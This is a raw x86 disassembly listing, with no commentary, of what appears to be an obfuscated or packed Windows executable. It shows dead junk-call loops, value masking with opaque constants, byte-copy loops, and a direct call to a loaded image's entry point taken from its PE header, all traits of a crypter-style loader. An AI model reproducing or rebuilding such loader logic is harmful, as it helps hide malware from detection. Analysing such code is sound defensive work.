  41bb87:	mov    edi,0x3272db
  41bb8c:	add    DWORD PTR ds:0x428000,0x429004
  41bb96:	add    eax,edi
  41bb98:	mov    DWORD PTR ds:0x428000,0xa07
  41bba2:	mov    DWORD PTR [ecx],eax
  41bba4:	mov    eax,0x1dcc
  41bba9:	mov    eax,ds:0x421e32
  41bbae:	cmp    eax,0x301ac8f5
  41bbb3:	mov    DWORD PTR ds:0x42a01c,0x9b1
  41bbbd:	jne    0x41bc4c
  41bbc3:	or     ecx,DWORD PTR ds:0x42b014
  41bbc9:	mov    eax,DWORD PTR [ebp-0x4]
  41bbcc:	dec    DWORD PTR ds:0x429000
  41bbd2:	mov    ecx,DWORD PTR ds:0x421c16
  41bbd8:	adc    DWORD PTR ds:0x42a004,ebx
  41bbde:	mov    ecx,DWORD PTR [ecx+0x198]
  41bbe4:	add    ebx,DWORD PTR ds:0x428014
  41bbea:	xor    eax,esi
  41bbec:	sbb    ebx,DWORD PTR ds:0x429010
  41bbf2:	add    eax,edi
  41bbf4:	mov    DWORD PTR [ecx],eax
  41bbf6:	and    DWORD PTR ds:0x428000,0x0
  41bc00:	xor    eax,eax
  41bc02:	add    eax,DWORD PTR ds:0x428000
  41bc08:	inc    eax
  41bc09:	mov    ds:0x428000,eax
  41bc0e:	cmp    DWORD PTR ds:0x428000,0x23
  41bc15:	jne    0x41bc2b
  41bc1b:	push   0x42388f
  41bc20:	push   0x4238c3
  41bc25:	call   DWORD PTR ds:0x424030
  41bc2b:	cmp    DWORD PTR ds:0x428000,0x17
  41bc32:	jb     0x41bc00
  41bc38:	mov    eax,DWORD PTR [ebp-0x4]
  41bc3b:	and    DWORD PTR ds:0x42a018,edx
  41bc41:	xor    eax,esi
  41bc43:	xor    ebx,ebx
  41bc45:	add    eax,edi
  41bc47:	mov    ds:0x421e32,eax
  41bc4c:	sub    eax,eax
  41bc4e:	mov    eax,ds:0x421c16
  41bc53:	adc    DWORD PTR ds:0x42b018,0x29cb
  41bc5d:	mov    eax,DWORD PTR [eax+0x18c]
  41bc63:	and    DWORD PTR ds:0x42a004,0x0
  41bc6d:	mov    ebx,DWORD PTR ds:0x42a004
  41bc73:	inc    ebx
  41bc74:	mov    DWORD PTR ds:0x42a004,ebx
  41bc7a:	cmp    DWORD PTR ds:0x42a004,0x13
  41bc81:	jne    0x41bca9
  41bc87:	push   0x49d6
  41bc8c:	push   0x649f
  41bc91:	push   DWORD PTR [ebp-0x20]
  41bc94:	push   0x2fe7
  41bc99:	push   0x2c94
  41bc9e:	push   0x42c018
  41bca3:	call   DWORD PTR ds:0x424038
  41bca9:	cmp    DWORD PTR ds:0x42a004,0x11
  41bcb0:	jb     0x41bc6d
  41bcb6:	xor    ecx,ecx
  41bcb8:	xor    ecx,DWORD PTR ds:0x42b004
  41bcbe:	sbb    ecx,DWORD PTR ds:0x42a008
  41bcc4:	mov    DWORD PTR ds:0x42b004,ecx
  41bcca:	mov    eax,DWORD PTR [eax]
  41bccc:	and    DWORD PTR ds:0x429004,0x0
  41bcd6:	xor    ecx,ecx
  41bcd8:	xor    ecx,DWORD PTR ds:0x429004
  41bcde:	inc    ecx
  41bcdf:	mov    DWORD PTR ds:0x429004,ecx
  41bce5:	cmp    DWORD PTR ds:0x429004,0xe
  41bcec:	jne    0x41bd02
  41bcf2:	push   0x42c014
  41bcf7:	push   0x2d10
  41bcfc:	call   DWORD PTR ds:0x42403c
  41bd02:	cmp    DWORD PTR ds:0x429004,0xd
  41bd09:	jne    0x41bd1c
  41bd0f:	mov    ecx,DWORD PTR ds:0x429004
  41bd15:	inc    ecx
  41bd16:	mov    DWORD PTR ds:0x429004,ecx
  41bd1c:	cmp    DWORD PTR ds:0x429004,0x1a
  41bd23:	jb     0x41bcd6
  41bd29:	or     ecx,ecx
  41bd2b:	mov    DWORD PTR [ebp-0x4c],eax
  41bd2e:	mov    ecx,0xf89c85ba
  41bd33:	sub    ebx,DWORD PTR ds:0x42c000
  41bd39:	mov    DWORD PTR [ebp-0x38],ecx
  41bd3c:	and    DWORD PTR ds:0x428024,edx
  41bd42:	mov    DWORD PTR [ebp-0x38],ecx
  41bd45:	and    DWORD PTR ds:0x42c014,0x0
  41bd4f:	mov    ebx,DWORD PTR ds:0x42c014
  41bd55:	inc    ebx
  41bd56:	mov    DWORD PTR ds:0x42c014,ebx
  41bd5c:	cmp    DWORD PTR ds:0x42c014,0x10
  41bd63:	jne    0x41bd77
  41bd69:	push   DWORD PTR [ebp-0x10]
  41bd6c:	push   0x42390e
  41bd71:	call   DWORD PTR ds:0x424040
  41bd77:	cmp    DWORD PTR ds:0x42c014,0xf
  41bd7e:	jne    0x41bd91
  41bd84:	mov    ebx,DWORD PTR ds:0x42c014
  41bd8a:	inc    ebx
  41bd8b:	mov    DWORD PTR ds:0x42c014,ebx
  41bd91:	cmp    DWORD PTR ds:0x42c014,0x1f
  41bd98:	jb     0x41bd4f
  41bd9e:	sub    eax,eax
  41bda0:	mov    DWORD PTR [ebp-0x38],ecx
  41bda3:	or     DWORD PTR ds:0x429014,0x293b
  41bdad:	mov    DWORD PTR [ebp-0x30],edx
  41bdb0:	sub    edx,0x44be
  41bdb6:	mov    DWORD PTR [ebp-0x38],ecx
  41bdb9:	add    eax,DWORD PTR ds:0x428000
  41bdbf:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  41bdc6:	mov    eax,DWORD PTR [ebp-0x4]
  41bdc9:	movzx  edx,WORD PTR ds:0x428020
  41bdd0:	add    DWORD PTR ds:0x42b00c,edx
  41bdd6:	mov    edx,DWORD PTR [ebp-0x8]
  41bdd9:	adc    ebx,0x414f
  41bddf:	mov    ebx,DWORD PTR [ebp-0x8]
  41bde2:	xor    ebx,esi
  41bde4:	and    DWORD PTR ds:0x42c018,0x42a004
  41bdee:	xor    edx,esi
  41bdf0:	add    edx,ebx
  41bdf2:	movzx  ebx,BYTE PTR ds:0x42a01c
  41bdf9:	and    DWORD PTR ds:0x429018,ebx
  41bdff:	mov    ebx,DWORD PTR [ebp-0x8]
  41be02:	xor    ebx,esi
  41be04:	xor    DWORD PTR ds:0x428028,0x1d40
  41be0e:	xor    eax,esi
  41be10:	sbb    DWORD PTR ds:0x42a008,0x42a018
  41be1a:	add    eax,edi
  41be1c:	lea    edx,[edx+ebx*1+0x975891]
  41be23:	mov    ebx,0x7216
  41be28:	mov    DWORD PTR [ebp-0x14],eax
  41be2b:	mov    ebx,0x8a29a123
  41be30:	mov    DWORD PTR ds:0x429018,0x7968
  41be3a:	cmp    eax,edx
  41be3c:	ja     0x41c14b
  41be42:	mov    DWORD PTR ds:0x42a008,0x16
  41be4c:	cmp    DWORD PTR ds:0x42a008,0x0
  41be53:	je     0x41bea1
  41be59:	cmp    DWORD PTR ds:0x42a008,0xa
  41be60:	jne    0x41be71
  41be66:	push   0x4238c3
  41be6b:	call   DWORD PTR ds:0x424044
  41be71:	cmp    DWORD PTR ds:0x42a008,0xb
  41be78:	jne    0x41be8d
  41be7e:	xor    ecx,ecx
  41be80:	xor    ecx,DWORD PTR ds:0x42a008
  41be86:	dec    ecx
  41be87:	mov    DWORD PTR ds:0x42a008,ecx
  41be8d:	xor    ecx,ecx
  41be8f:	add    ecx,DWORD PTR ds:0x42a008
  41be95:	dec    ecx
  41be96:	mov    DWORD PTR ds:0x42a008,ecx
  41be9c:	jmp    0x41be4c
  41bea1:	mov    ecx,DWORD PTR [ebp-0x8]
  41bea4:	xor    ecx,esi
  41bea6:	lea    ecx,[ecx+eax*1+0x3272db]
  41bead:	or     DWORD PTR ds:0x429014,0x429018
  41beb7:	mov    DWORD PTR [ebp-0x10],ecx
  41beba:	mov    ecx,DWORD PTR [ebp-0x30]
  41bebd:	xor    ecx,esi
  41bebf:	adc    edx,0x7be1
  41bec5:	lea    ecx,[ebp+ecx*1+0x3272e3]
  41becc:	add    DWORD PTR ds:0x42b00c,0x3739
  41bed6:	mov    DWORD PTR [ebp-0x38],ecx
  41bed9:	and    DWORD PTR ds:0x429010,0x0
  41bee3:	mov    edx,DWORD PTR ds:0x429010
  41bee9:	inc    edx
  41beea:	mov    DWORD PTR ds:0x429010,edx
  41bef0:	cmp    DWORD PTR ds:0x429010,0x21
  41bef7:	jne    0x41bf12
  41befd:	push   0x1770
  41bf02:	push   0x42c01c
  41bf07:	push   0x423986
  41bf0c:	call   DWORD PTR ds:0x424048
  41bf12:	cmp    DWORD PTR ds:0x429010,0x1b
  41bf19:	jb     0x41bee3
  41bf1f:	mov    ecx,DWORD PTR ds:0x421c16
  41bf25:	mov    ecx,DWORD PTR [ecx+0x1bc]
  41bf2b:	and    DWORD PTR ds:0x42900c,0x0
  41bf35:	jmp    0x41bf47
  41bf3a:	mov    edx,DWORD PTR ds:0x42900c
  41bf40:	inc    edx
  41bf41:	mov    DWORD PTR ds:0x42900c,edx
  41bf47:	cmp    DWORD PTR ds:0x42900c,0x19
  41bf4e:	jae    0x41bf96
  41bf54:	cmp    DWORD PTR ds:0x42900c,0xa
  41bf5b:	jne    0x41bf6f
  41bf61:	push   0x42900c
  41bf66:	push   DWORD PTR [ebp-0x28]
  41bf69:	call   DWORD PTR ds:0x424014
  41bf6f:	cmp    DWORD PTR ds:0x42900c,0x9
  41bf76:	jne    0x41bf8b
  41bf7c:	xor    edx,edx
  41bf7e:	or     edx,DWORD PTR ds:0x42900c
  41bf84:	inc    edx
  41bf85:	mov    DWORD PTR ds:0x42900c,edx
  41bf8b:	jmp    0x41bf3a
  41bf90:	adc    edx,DWORD PTR ds:0x42b00c
  41bf96:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41bf9d:	and    DWORD PTR ds:0x42b00c,0x0
  41bfa7:	jmp    0x41bfbb
  41bfac:	xor    edx,edx
  41bfae:	xor    edx,DWORD PTR ds:0x42b00c
  41bfb4:	inc    edx
  41bfb5:	mov    DWORD PTR ds:0x42b00c,edx
  41bfbb:	cmp    DWORD PTR ds:0x42b00c,0x10
  41bfc2:	jae    0x41c020
  41bfc8:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bfcf:	jne    0x41bfff
  41bfd5:	push   0x33b5
  41bfda:	push   0x42b014
  41bfdf:	push   0x1dc5
  41bfe4:	push   0x42801c
  41bfe9:	push   DWORD PTR [ebp-0x14]
  41bfec:	push   0x39d8
  41bff1:	push   DWORD PTR [ebp-0x14]
  41bff4:	push   0x8914
  41bff9:	call   DWORD PTR ds:0x424018
  41bfff:	cmp    DWORD PTR ds:0x42b00c,0x4
  41c006:	jne    0x41c01b
  41c00c:	xor    edx,edx
  41c00e:	xor    edx,DWORD PTR ds:0x42b00c
  41c014:	inc    edx
  41c015:	mov    DWORD PTR ds:0x42b00c,edx
  41c01b:	jmp    0x41bfac
  41c020:	mov    DWORD PTR [ebp-0x34],ecx
  41c023:	and    DWORD PTR ds:0x42b01c,0x11ac
  41c02d:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  41c034:	sub    ecx,ecx
  41c036:	mov    ecx,DWORD PTR [ebp-0xc]
  41c039:	or     edx,DWORD PTR ds:0x428018
  41c03f:	mov    edx,DWORD PTR [ebp-0x10]
  41c042:	xor    ecx,esi
  41c044:	add    ecx,edi
  41c046:	cmp    ecx,edx
  41c048:	je     0x41c117
  41c04e:	mov    eax,DWORD PTR [ebp-0xc]
  41c051:	mov    ecx,DWORD PTR [ebp-0x10]
  41c054:	xor    edx,edx
  41c056:	xor    eax,esi
  41c058:	add    eax,edi
  41c05a:	add    ecx,0xfabdbef1
  41c060:	adc    edx,0xffffffff
  41c063:	xor    ecx,ebx
  41c065:	xor    edx,0x0
  41c068:	mov    DWORD PTR [ebp-0x68],ecx
  41c06b:	mov    DWORD PTR [ebp-0x64],edx
  41c06e:	xor    edx,edx
  41c070:	mov    ecx,eax
  41c072:	add    ecx,0xfabdbef1
  41c078:	adc    edx,0xffffffff
  41c07b:	xor    ecx,ebx
  41c07d:	xor    edx,0x0
  41c080:	mov    DWORD PTR [ebp-0x24],eax
  41c083:	mov    DWORD PTR [ebp-0x74],edx
  41c086:	cmp    ecx,DWORD PTR [ebp-0x68]
  41c089:	jne    0x41c09a
  41c08f:	mov    ecx,DWORD PTR [ebp-0x64]
  41c092:	cmp    edx,ecx
  41c094:	je     0x41c114
  41c09a:	mov    ecx,DWORD PTR [ebp-0xc]
  41c09d:	mov    edx,DWORD PTR [ebp-0x20]
  41c0a0:	xor    edx,esi
  41c0a2:	add    edx,edi
  41c0a4:	imul   edx,eax
  41c0a7:	xor    ecx,esi
  41c0a9:	add    ecx,eax
  41c0ab:	mov    eax,DWORD PTR [ebp-0x34]
  41c0ae:	mov    ebx,DWORD PTR [ebp-0x38]
  41c0b1:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c0b8:	mov    BYTE PTR [edx+eax*1],cl
  41c0bb:	mov    eax,DWORD PTR [ebp-0x20]
  41c0be:	mov    ecx,DWORD PTR [ebp-0x24]
  41c0c1:	xor    eax,esi
  41c0c3:	lea    eax,[ecx+eax*1+0x3272db]
  41c0ca:	mov    ecx,DWORD PTR [ebp-0x10]
  41c0cd:	xor    edx,edx
  41c0cf:	add    ecx,0xfabdbef1
  41c0d5:	adc    edx,0xffffffff
  41c0d8:	xor    edx,0x0
  41c0db:	mov    ebx,0x8a29a123
  41c0e0:	xor    ecx,ebx
  41c0e2:	mov    DWORD PTR [ebp-0x70],ecx
  41c0e5:	mov    DWORD PTR [ebp-0x6c],edx
  41c0e8:	xor    edx,edx
  41c0ea:	mov    ecx,eax
  41c0ec:	add    ecx,0xfabdbef1
  41c0f2:	adc    edx,0xffffffff
  41c0f5:	xor    ecx,ebx
  41c0f7:	xor    edx,0x0
  41c0fa:	mov    DWORD PTR [ebp-0x24],eax
  41c0fd:	mov    DWORD PTR [ebp-0x7c],edx
  41c100:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c103:	jne    0x41c09a
  41c109:	mov    ecx,DWORD PTR [ebp-0x6c]
  41c10c:	cmp    edx,ecx
  41c10e:	jne    0x41c09a
  41c114:	mov    eax,DWORD PTR [ebp-0x14]
  41c117:	mov    ecx,DWORD PTR [ebp-0x8]
  41c11a:	xor    ecx,esi
  41c11c:	lea    eax,[eax+ecx*1+0x3272db]
  41c123:	mov    ecx,DWORD PTR [ebp-0x8]
  41c126:	mov    edx,DWORD PTR [ebp-0x8]
  41c129:	xor    edx,esi
  41c12b:	xor    ecx,esi
  41c12d:	add    ecx,edx
  41c12f:	mov    edx,DWORD PTR [ebp-0x8]
  41c132:	xor    edx,esi
  41c134:	lea    ecx,[ecx+edx*1+0x975891]
  41c13b:	mov    DWORD PTR [ebp-0x14],eax
  41c13e:	cmp    eax,ecx
  41c140:	jbe    0x41be42
  41c146:	mov    ecx,0xf89c85ba
  41c14b:	mov    eax,DWORD PTR [ebp+0xc]
  41c14e:	mov    ds:0x421a9a,eax
  41c153:	mov    eax,DWORD PTR [ebp+0x10]
  41c156:	mov    ds:0x421cee,eax
  41c15b:	mov    eax,ds:0x421a9a
  41c160:	mov    edx,DWORD PTR [ebp-0x3c]
  41c163:	sub    eax,edi
  41c165:	xor    eax,esi
  41c167:	mov    DWORD PTR [edx],eax
  41c169:	mov    eax,DWORD PTR [ebp-0x18]
  41c16c:	cmp    eax,0xf89c85b6
  41c171:	jne    0x41c19c
  41c177:	lea    eax,[ebp-0x28]
  41c17a:	mov    DWORD PTR [ebp-0x40],eax
  41c17d:	lea    eax,[ebp+0x4]
  41c180:	mov    DWORD PTR [ebp-0x28],eax
  41c183:	mov    eax,DWORD PTR [ebp-0x28]
  41c186:	test   eax,eax
  41c188:	je     0x41c2b4
  41c18e:	mov    eax,DWORD PTR [ebp-0x1c]
  41c191:	mov    eax,DWORD PTR [ebp-0x8]
  41c194:	lea    eax,[ebp-0x40]
  41c197:	jmp    0x41c2ab
  41c19c:	mov    eax,DWORD PTR [ebp-0x44]
  41c19f:	cmp    eax,0xf89c85b5
  41c1a4:	je     0x41c201
  41c1aa:	mov    eax,DWORD PTR [ebp-0x4]
  41c1ad:	mov    edx,DWORD PTR [ebp-0x48]
  41c1b0:	xor    eax,esi
  41c1b2:	add    eax,edi
  41c1b4:	cmp    eax,edx
  41c1b6:	je     0x41c201
  41c1bc:	mov    eax,ds:0x421c16
  41c1c1:	mov    eax,DWORD PTR [eax+0x194]
  41c1c7:	mov    ecx,DWORD PTR [eax]
  41c1c9:	mov    eax,DWORD PTR [ecx+0x3c]
  41c1cc:	push   DWORD PTR ds:0x421cee
  41c1d2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41c1d6:	push   DWORD PTR ds:0x421a9a
  41c1dc:	add    eax,ecx
  41c1de:	mov    ecx,DWORD PTR ds:0x421c16
  41c1e4:	mov    ecx,DWORD PTR [ecx+0x194]
  41c1ea:	push   DWORD PTR [ecx]
  41c1ec:	call   eax
  41c1ee:	mov    ecx,DWORD PTR ds:0x421c16
  41c1f4:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41c1fa:	mov    DWORD PTR [ecx],eax
  41c1fc:	jmp    0x41c2b4
  41c201:	mov    eax,DWORD PTR [ebp-0x4]
  41c204:	mov    edx,DWORD PTR [ebp-0x4c]
  41c207:	xor    eax,esi
  41c209:	add    eax,edi
  41c20b:	cmp    eax,edx
  41c20d:	jne    0x41c26a
  41c213:	mov    eax,DWORD PTR [ebp-0x4]
  41c216:	mov    edx,DWORD PTR ds:0x421c16
  41c21c:	mov    edx,DWORD PTR [edx+0x198]
  41c222:	xor    eax,esi
  41c224:	add    eax,edi
  41c226:	cmp    eax,DWORD PTR [edx]
  41c228:	jne    0x41c247
  41c22e:	mov    eax,DWORD PTR [ebp-0x4]
  41c231:	push   0xf89c85b6
  41c236:	xor    eax,esi
  41c238:	add    eax,edi
  41c23a:	push   eax
  41c23b:	push   ecx
  41c23c:	push   DWORD PTR [ebp-0x8]
  41c23f:	push   DWORD PTR [ebp-0x4]
  41c242:	call   0x413d37
  41c247:	push   DWORD PTR [ebp-0x8]
  41c24a:	push   DWORD PTR [ebp-0x4]
  41c24d:	call   0x41af10
  41c252:	mov    eax,DWORD PTR [ebp-0x4]
  41c255:	xor    eax,esi
  41c257:	add    eax,edi
  41c259:	mov    ds:0x421c9a,eax
  41c25e:	mov    eax,DWORD PTR [ebp-0x4]
  41c261:	xor    eax,esi
  41c263:	add    eax,edi
  41c265:	mov    ds:0x421c92,eax
  41c26a:	lea    eax,[ebp-0x2c]
  41c26d:	mov    DWORD PTR [ebp-0x50],eax
  41c270:	lea    eax,[ebp+0x4]
  41c273:	mov    DWORD PTR [ebp-0x2c],eax
  41c276:	mov    eax,DWORD PTR [ebp-0x2c]
  41c279:	test   eax,eax
  41c27b:	je     0x41c2b4
  41c281:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  41c288:	mov    DWORD PTR [ebp-0x58],0x712ed08
  41c28f:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  41c296:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  41c29d:	call   0x401000
  41c2a2:	mov    eax,DWORD PTR [ebp-0x1c]
  41c2a5:	mov    eax,DWORD PTR [ebp-0x8]
  41c2a8:	lea    eax,[ebp-0x50]
  41c2ab:	push   eax
  41c2ac:	push   DWORD PTR [ebp-0x4]
  41c2af:	call   0x40cf5e
  41c2b4:	mov    eax,ds:0x421c16
  41c2b9:	add    eax,0x1cc
  41c2be:	mov    DWORD PTR [ebp-0x38],eax
  41c2c1:	lea    eax,[ebp-0x1c]
  41c2c4:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  41c2cb:	mov    DWORD PTR [ebp-0x3c],eax
  41c2ce:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  41c2d5:	mov    eax,DWORD PTR [ebp+0xc]
  41c2d8:	xor    eax,esi
  41c2da:	mov    DWORD PTR [ebp+0x10],0x4
  41c2e1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2e4:	add    eax,edi
  41c2e6:	cmp    eax,ecx
  41c2e8:	je     0x41c3a9
  41c2ee:	mov    eax,DWORD PTR [ebp+0xc]
  41c2f1:	mov    ecx,DWORD PTR [ebp+0x10]
  41c2f4:	xor    edx,edx
  41c2f6:	xor    eax,esi
  41c2f8:	add    eax,edi
  41c2fa:	add    ecx,0xfabdbef1
  41c300:	adc    edx,0xffffffff
  41c303:	xor    ecx,ebx
  41c305:	xor    edx,0x0
  41c308:	mov    DWORD PTR [ebp-0x70],ecx
  41c30b:	mov    DWORD PTR [ebp-0x6c],edx
  41c30e:	xor    edx,edx
  41c310:	mov    ecx,eax
  41c312:	add    ecx,0xfabdbef1
  41c318:	adc    edx,0xffffffff
  41c31b:	xor    ecx,ebx
  41c31d:	xor    edx,0x0
  41c320:	mov    DWORD PTR [ebp-0x20],eax
  41c323:	cmp    ecx,DWORD PTR [ebp-0x70]
  41c326:	jne    0x41c335
  41c32c:	cmp    edx,DWORD PTR [ebp-0x6c]
  41c32f:	je     0x41c3a9
  41c335:	mov    ecx,DWORD PTR [ebp+0xc]
  41c338:	mov    edx,DWORD PTR [ebp-0x24]
  41c33b:	xor    edx,esi
  41c33d:	xor    ecx,esi
  41c33f:	add    ecx,eax
  41c341:	add    edx,edi
  41c343:	imul   edx,eax
  41c346:	mov    eax,DWORD PTR [ebp-0x3c]
  41c349:	mov    ebx,DWORD PTR [ebp-0x38]
  41c34c:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  41c353:	mov    BYTE PTR [edx+eax*1],cl
  41c356:	mov    eax,DWORD PTR [ebp-0x24]
  41c359:	mov    ecx,DWORD PTR [ebp-0x20]
  41c35c:	mov    edx,DWORD PTR [ebp+0x10]
  41c35f:	xor    eax,esi
  41c361:	lea    eax,[ecx+eax*1+0x3272db]
  41c368:	xor    ecx,ecx
  41c36a:	add    edx,0xfabdbef1
  41c370:	adc    ecx,0xffffffff
  41c373:	xor    ecx,0x0
  41c376:	mov    DWORD PTR [ebp-0x7c],ecx
  41c379:	xor    ebx,ebx
  41c37b:	xor    edx,0x8a29a123
  41c381:	mov    ecx,eax
  41c383:	add    ecx,0xfabdbef1
  41c389:	adc    ebx,0xffffffff
  41c38c:	xor    ecx,0x8a29a123
  41c392:	xor    ebx,0x0
  41c395:	mov    DWORD PTR [ebp-0x20],eax
  41c398:	cmp    ecx,edx
  41c39a:	jne    0x41c335
  41c3a0:	cmp    ebx,DWORD PTR [ebp-0x7c]
  41c3a3:	jne    0x41c335
  41c3a9:	mov    eax,DWORD PTR [ebp-0x1c]
  41c3ac:	mov    eax,DWORD PTR [eax]
  41c3ae:	pop    edi
  41c3af:	pop    esi
  41c3b0:	pop    ebx
  41c3b1:	leave  
  41c3b2:	ret    0xc
  41c3b5:	push   ebp
  41c3b6:	mov    ebp,esp
  41c3b8:	sub    esp,0xa4
  41c3be:	mov    ecx,DWORD PTR [ebp+0x8]
  41c3c1:	and    DWORD PTR ds:0x42a01c,0x0
  41c3cb:	jmp    0x41c3db
  41c3d0:	mov    eax,ds:0x42a01c
  41c3d5:	inc    eax
  41c3d6:	mov    ds:0x42a01c,eax
  41c3db:	cmp    DWORD PTR ds:0x42a01c,0x17
  41c3e2:	jae    0x41c404
  41c3e8:	cmp    DWORD PTR ds:0x42a01c,0x25
  41c3ef:	jne    0x41c3fe
  41c3f5:	push   DWORD PTR [ebp-0x14]
  41c3f8:	call   DWORD PTR ds:0x42401c
  41c3fe:	jmp    0x41c3d0
  41c403:	inc    eax
  41c404:	mov    eax,0x8a85
  41c409:	sub    DWORD PTR ds:0x42a008,0x36bb
  41c413:	xor    ax,WORD PTR [ecx+0x20]
  41c417:	mov    DWORD PTR ds:0x42c018,0x1e
  41c421:	cmp    DWORD PTR ds:0x42c018,0x0
  41c428:	je     0x41c465
  41c42e:	cmp    DWORD PTR ds:0x42c018,0x25
  41c435:	jne    0x41c449
  41c43b:	push   DWORD PTR [ebp-0x10]
  41c43e:	push   0x3dbe
  41c443:	call   DWORD PTR ds:0x424020
  41c449:	mov    ecx,DWORD PTR ds:0x42c018
  41c44f:	dec    ecx
  41c450:	mov    DWORD PTR ds:0x42c018,ecx
  41c456:	jmp    0x41c421
  41c45b:	sub    DWORD PTR ds:0x428014,0x2577
  41c465:	mov    ecx,0x3b4b
  41c46a:	xor    DWORD PTR ds:0x42b00c,0x43e8
  41c474:	add    ax,cx
  41c477:	mov    DWORD PTR ds:0x429004,0x1e
  41c481:	cmp    DWORD PTR ds:0x429004,0x0
  41c488:	je     0x41c4e7
  41c48e:	cmp    DWORD PTR ds:0x429004,0x2c
  41c495:	jne    0x41c4c5
  41c49b:	push   0x42c000
  41c4a0:	push   0x3d75
  41c4a5:	push   DWORD PTR [ebp-0x20]
  41c4a8:	push   0x42c004
  41c4ad:	push   DWORD PTR [ebp-0xc]
  41c4b0:	push   0x423822
  41c4b5:	push   0x75d0
  41c4ba:	push   0x7026
  41c4bf:	call   DWORD PTR ds:0x424024
  41c4c5:	xor    ecx,ecx
  41c4c7:	add    ecx,DWORD PTR ds:0x429004
  41c4cd:	dec    ecx
  41c4ce:	mov    DWORD PTR ds:0x429004,ecx
  41c4d4:	jmp    0x41c481
  41c4d9:	mov    ecx,DWORD PTR ds:0x421a46
  41c4df:	mov    ecx,DWORD PTR [ecx]
  41c4e1:	and    DWORD PTR ds:0x428024,ecx
  41c4e7:	movzx  eax,ax
  41c4ea:	xor    DWORD PTR ds:0x42a004,0x42801c
  41c4f4:	mov    DWORD PTR [ebp-0x18],eax
  41c4f7:	and    DWORD PTR ds:0x42801c,0x7f28
  41c501:	mov    BYTE PTR [ebp-0x1],0x61
  41c505:	xor    ecx,0x4092
  41c50b:	lea    eax,[ebp-0x1]
  41c50e:	sub    DWORD PTR ds:0x429008,0x31e1
  41c518:	mov    DWORD PTR [ebp-0x10],eax
  41c51b:	add    ecx,DWORD PTR ds:0x428010
  41c521:	mov    al,BYTE PTR [ebp-0x1]
  41c524:	and    ecx,0x7ba8
  41c52a:	mov    ecx,DWORD PTR [ebp-0x10]
  41c52d:	xor    al,0x6f
  41c52f:	and    DWORD PTR ds:0x428008,0x42b018
  41c539:	sub    al,0xd
  41c53b:	adc    DWORD PTR ds:0x428018,0x42b008
  41c545:	mov    BYTE PTR [ecx],al
  41c547:	add    DWORD PTR ds:0x42a01c,ecx
  41c54d:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  41c554:	mov    DWORD PTR ds:0x42a010,0x1c
  41c55e:	cmp    DWORD PTR ds:0x42a010,0x0
  41c565:	je     0x41c5a5
  41c56b:	cmp    DWORD PTR ds:0x42a010,0x2c
  41c572:	jne    0x41c58b
  41c578:	push   0x5aa3
  41c57d:	push   0x697d
  41c582:	push   DWORD PTR [ebp-0x28]
  41c585:	call   DWORD PTR ds:0x424028
  41c58b:	xor    ecx,ecx
  41c58d:	add    ecx,DWORD PTR ds:0x42a010
  41c593:	dec    ecx
  41c594:	mov    DWORD PTR ds:0x42a010,ecx
  41c59a:	jmp    0x41c55e
  41c59f:	sbb    DWORD PTR ds:0x42a000,ebx
  41c5a5:	push   ebx
  41c5a6:	sbb    eax,ecx
  41c5a8:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41c5af:	and    DWORD PTR ds:0x428020,0x0
  41c5b9:	jmp    0x41c5cb
  41c5be:	mov    ecx,DWORD PTR ds:0x428020
  41c5c4:	inc    ecx
  41c5c5:	mov    DWORD PTR ds:0x428020,ecx
  41c5cb:	cmp    DWORD PTR ds:0x428020,0x19
  41c5d2:	jae    0x41c5fa
  41c5d8:	cmp    DWORD PTR ds:0x428020,0x28
  41c5df:	jne    0x41c5f5
  41c5e5:	push   0x423978
  41c5ea:	push   0x4238dd
  41c5ef:	call   DWORD PTR ds:0x424030
  41c5f5:	jmp    0x41c5be
  41c5fa:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5fd:	push   esi
  41c5fe:	movzx  esi,BYTE PTR ds:0x42a014
  41c605:	sub    esi,DWORD PTR ds:0x429018
  41c60b:	mov    DWORD PTR ds:0x42a014,esi
  41c611:	mov    eax,0x7510893
  41c616:	mov    esi,DWORD PTR ds:0x42a01c
  41c61c:	adc    esi,DWORD PTR ds:0x42a00c
  41c622:	mov    DWORD PTR ds:0x42a01c,esi
  41c628:	xor    ecx,eax
  41c62a:	neg    esi
  41c62c:	mov    esi,0x3272db
  41c631:	push   edi
  41c632:	add    ecx,esi
  41c634:	mov    DWORD PTR ds:0x42b018,0x6b60
  41c63e:	jmp    0x41c662
  41c643:	mov    DWORD PTR ds:0x42b000,0x231b
  41c64d:	mov    dl,BYTE PTR [ebp-0x1]
  41c650:	mov    DWORD PTR ds:0x42a018,0x496a
  41c65a:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41c661:	inc    ecx
  41c662:	mov    DWORD PTR ds:0x429014,0x116e
  41c66c:	cmp    ecx,0x40
  41c66f:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c679:	jb     0x41c643
  41c67f:	and    edx,DWORD PTR ds:0x428008
  41c685:	mov    edx,DWORD PTR [ebp-0x14]
  41c688:	sbb    DWORD PTR ds:0x429004,0x429010
  41c692:	xor    edx,eax
  41c694:	add    edx,esi
  41c696:	jmp    0x41c829
  41c69b:	mov    DWORD PTR ds:0x429018,0x1f
  41c6a5:	cmp    DWORD PTR ds:0x429018,0x0
  41c6ac:	je     0x41c713
  41c6b2:	cmp    DWORD PTR ds:0x429018,0xf
  41c6b9:	jne    0x41c6dd
  41c6bf:	push   DWORD PTR [ebp-0x20]
  41c6c2:	push   DWORD PTR [ebp-0x10]
  41c6c5:	push   0x45b6
  41c6ca:	push   DWORD PTR [ebp-0x1c]
  41c6cd:	push   0x5bd1
  41c6d2:	push   0x42c008
  41c6d7:	call   DWORD PTR ds:0x424038
